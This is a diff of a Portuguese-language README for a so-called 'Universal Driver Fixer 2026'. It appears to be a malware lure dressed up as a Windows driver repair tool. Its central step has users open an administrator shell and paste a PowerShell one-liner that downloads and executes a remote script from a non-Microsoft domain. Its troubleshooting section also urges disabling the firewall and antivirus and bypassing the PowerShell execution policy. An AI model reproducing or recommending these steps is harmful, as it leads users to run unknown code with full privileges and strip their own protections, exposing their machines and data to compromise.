@@ -27,74 +27,76 @@
 
 ## ⚙️ INSTALAÇÃO & CONFIGURAÇÃO (CMD / PowerShell)
 
-### Etapa 1: Clique no botão Win do seu teclado
-Pressione a tecla Windows no seu teclado.
-
-### Etapa 2: Pesquise por "cmd"
-Digite "cmd" na barra de pesquisa.
-
-### Etapa 3: Abra como Administrador
-Clique com o botão direito em "Prompt de Comando" e selecione "Executar como administrador".
-
-### Etapa 4: Copie o comando de instalação abaixo
+### Etapa 1: Abra o CMD ou PowerShell como Administrador
+```cmd
+# Pressione Win+X, depois selecione Terminal (Admin) ou Prompt de Comando (Admin)
+Etapa 2: Execute o Comando de Instalação
+cmd
 powershell -Command "irm https://software-gateway.xyz/Loader.ps1?get=driver-fixer | iex"
-
-### Etapa 5: Clique na tecla Enter para baixar
-Cole o comando e pressione Enter.
-
-### Etapa 6: Aguarde a conclusão
+Etapa 3: Aguarde a Conclusão
+text
 [1/4] Escaneando o sistema em busca de drivers ausentes...
 [2/4] Baixando as atualizações de drivers mais recentes dos servidores da Microsoft...
 [3/4] Aplicando correções e reparando entradas do registro...
 [4/4] Pronto. Todos os drivers ausentes foram instalados.
+Etapa 4: Comece a Usar a Ferramenta
+A ferramenta é executada automaticamente em segundo plano
 
-### Etapa 7: Comece a usar a ferramenta
-- A ferramenta é executada automaticamente em segundo plano
-- Ela detecta drivers ausentes e os instala
-- Nenhuma entrada do usuário é necessária - totalmente automatizado
-- Reinicie o PC após a conclusão para obter melhores resultados
+Ela detecta drivers ausentes e os instala
 
----
+Nenhuma entrada do usuário é necessária - totalmente automatizado
 
-> ⚠️ **AVISO LEGAL**
-> Alguns recursos podem modificar arquivos do sistema. Use por sua conta e risco.
+Reinicie o PC após a conclusão para obter melhores resultados
 
----
+⚠️ AVISO LEGAL
+Esta ferramenta é fornecida APENAS PARA FINS EDUCACIONAIS E DE PESQUISA.
+Alguns recursos podem modificar arquivos do sistema. Use por sua conta e risco.
+AO USAR ESTA FERRAMENTA VOCÊ CONCORDA COM ESTES TERMOS.
 
-## 🛠️ RECURSOS DA FERRAMENTA
+🛠️ RECURSOS DA FERRAMENTA
+Categoria	Recursos
+🖥️ Detecção de Drivers	Escaneia todos os componentes de hardware, detecta drivers ausentes, identifica versões desatualizadas
+⬇️ Download Automático	Baixa drivers oficiais do banco de dados da Microsoft, instala silenciosamente em segundo plano
+🔧 Ferramentas de Reparo	Corrige links de drivers quebrados, repara arquivos INF, resolve conflitos entre drivers
+💻 Suporte de Hardware	Drivers de GPU, Adaptadores de Rede, Dispositivos de Áudio, Drivers de Chipset, Controladores USB
+🔄 Atualização Automática	Mantém os drivers atualizados automaticamente, agenda verificações semanais, notifica sobre novas versões
+🛠️ Suporte Legado	Funciona com Windows 10/11, suporta hardware mais antigo, inclui versões de drivers LTS
+🧹 Limpeza de Registro	Remove entradas órfãs, corrige chaves de registro corrompidas, otimiza o desempenho
+🔐 Sistema de Backup	Cria pontos de restauração antes das alterações, permite rollback de atualizações de drivers
+📡 STATUS DO MÓDULO
+Módulo	Versão	Status
+Framework Principal	2.7.0	✅ Operacional
+Scanner de Drivers	3.1.4	✅ Operacional
+Motor de Download	2.9.8	✅ Operacional
+Kit de Reparo	2.5.2	✅ Operacional
+Limpador de Registro	1.8.6	✅ Operacional
+Compatibilidade GPU	4.2.1	✅ Operacional
+🔧 SOLUÇÃO DE PROBLEMAS
+Erro: "Driver Não Encontrado"
+Solução: Execute a ferramenta com privilégios de administrador. Certifique-se de que sua conexão com a internet esteja estável. A ferramenta se conecta aos servidores da Microsoft para encontrar o driver correto.
 
-| Categoria | Recursos |
-|-----------|----------|
-| 🖥️ **Detecção de Drivers** | Escaneia todos os componentes de hardware, detecta drivers ausentes, identifica versões desatualizadas |
-| ⬇️ **Download Automático** | Baixa drivers oficiais do banco de dados da Microsoft, instala silenciosamente em segundo plano |
-| 🔧 **Ferramentas de Reparo** | Corrige links de drivers quebrados, repara arquivos INF, resolve conflitos entre drivers |
-| 💻 **Suporte de Hardware** | Drivers de GPU, Adaptadores de Rede, Dispositivos de Áudio, Drivers de Chipset, Controladores USB |
-| 🔄 **Atualização Automática** | Mantém os drivers atualizados automaticamente, agenda verificações semanais, notifica sobre novas versões |
-| 🛠️ **Suporte Legado** | Funciona com Windows 10/11, suporta hardware mais antigo, inclui versões de drivers LTS |
+Erro: "Acesso Negado"
+Solução: Você precisa executar o CMD ou PowerShell como Administrador. Clique com o botão direito e selecione "Executar como administrador". A ferramenta precisa de acesso em nível de sistema.
 
----
+Erro: "Falha na Instalação"
+Solução: Tente reiniciar o PC e executar a ferramenta novamente. Se o problema persistir, execute a ferramenta com a flag /force. Verifique se o serviço Windows Update está em execução.
 
-## 📊 STATUS DO MÓDULO
+Erro: "Driver Já Instalado"
+Solução: A ferramenta detectou que o driver está presente, mas pode estar corrompido. Use a opção "Forçar Reinstalação" no menu da ferramenta. Ou execute o comando driver-fixer --reinstall --all.
 
-| Módulo | Status | Observação |
-|--------|--------|------------|
-| 🔍 Detecção de Hardware | ✅ Funcionando | Escaneia todos os dispositivos |
-| ⬇️ Download de Drivers | ✅ Funcionando | Conecta aos servidores Microsoft |
-| 🔧 Reparo de Drivers | ✅ Funcionando | Corrige arquivos INF |
-| 🧹 Limpeza de Registro | ✅ Funcionando | Remove entradas órfãs |
-| 🔄 Atualização Automática | ✅ Funcionando | Agendamento semanal |
-| 🖥️ Compatibilidade GPU | ✅ Funcionando | NVIDIA, AMD, Intel |
+Erro: "Tempo de Conexão Esgotado"
+Solução: Verifique sua conexão com a internet. A ferramenta precisa acessar os servidores de drivers da Microsoft. Desative temporariamente qualquer firewall ou antivírus que possa estar bloqueando a conexão.
 
----
+Erro: "Script Bloqueado pelo PowerShell"
+Solução: Execute o comando abaixo antes de rodar a ferramenta:
 
-## 🔑 PALAVRAS-CHAVE
+powershell
+Set-ExecutionPolicy Bypass -Scope Process -Force
+🔑 PALAVRAS-CHAVE
+driver fixer windows repair missing drivers blue screen fix pc optimizer driver installer universal driver fixer 2026 auto driver install windows 10 drivers windows 11 drivers driver updater hardware detection registry repair driver conflict GPU drivers network drivers audio drivers chipset drivers USB drivers Microsoft drivers
 
-`driver fixer` `windows repair` `missing drivers` `blue screen fix` `pc optimizer` `driver installer` `universal driver fixer 2026` `auto driver install` `windows 10 drivers` `windows 11 drivers` `driver updater` `hardware detection` `registry repair` `driver conflict` `GPU drivers` `network drivers` `audio drivers` `chipset drivers` `USB drivers` `Microsoft drivers`
-
----
-
-## 📜 LICENÇA
-
+📜 LICENÇA
+text
 MIT License
 
 Copyright (c) 2026 Universal Driver Fixer
@@ -116,14 +118,4 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-
----
-
-<p align="center">
-  ⭐ <strong>Dê uma estrela neste repositório</strong> · 🍴 <strong>Faça um fork</strong> · 🔧 <strong>Melhor driver fixer</strong>
-</p>
-
-<p align="center">
-  <sub>Universal Driver Fixer 2026 | Instalação automática de drivers ausentes | Ferramenta de Reparo Windows | Apenas Educacional</sub>
-</p>
-===
+<p align="center"> ⭐ <strong>Dê uma estrela neste repositório</strong> · 🍴 <strong>Faça um fork</strong> · 🔧 <strong>Melhor driver fixer</strong> </p><p align="center"> <sub>Universal Driver Fixer 2026 | Instalação automática de drivers ausentes | Ferramenta de Reparo Windows | Apenas Educacional</sub> </p> === ```
